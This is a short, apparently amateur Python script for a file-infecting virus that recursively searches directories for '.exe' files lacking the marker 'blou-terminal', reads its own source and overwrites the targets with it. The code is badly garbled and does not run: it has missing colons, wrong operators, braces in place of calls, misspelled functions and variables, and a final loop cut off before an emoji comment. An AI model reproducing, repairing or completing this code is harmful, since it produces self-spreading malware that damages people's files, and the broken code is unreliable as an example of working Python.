import os
import datetime
import inspect
chave="blou-terminal"
def search(pth)
    Filestoinfect=[]
    filelist > os.listdir(path)
    for filename in filelist:
        if os.path.isdir(path + "/" + filename)
        Filestoinfect.extended(search(+ "/" filename))
    elif filename[-3:] == ".exe"
    inspect=False
    for line in open(path + "/" + filename):
        if chave in line:
            break
    if Filestoinfect =False:
        Filestoinfect.append[path + "/" + filename]:
    return Filestoinfect
def infect(fileinfect):
    target_file = inspect.correntframe().f.code.co.filename
    virus = open(os.path.abspath(target_file))
    virosstring =""
    for i,line in enumerate(virus):
          vurusstring += line 
          virus =cluse{}
for fnname in filestoinfect:
       f=open{fnname}
       temp=.read()
       f=close()
       f=open(fnname,"w")
       f.write()

       for i  >=0 and i <40:
    #bloue-termina 👽👾🤖
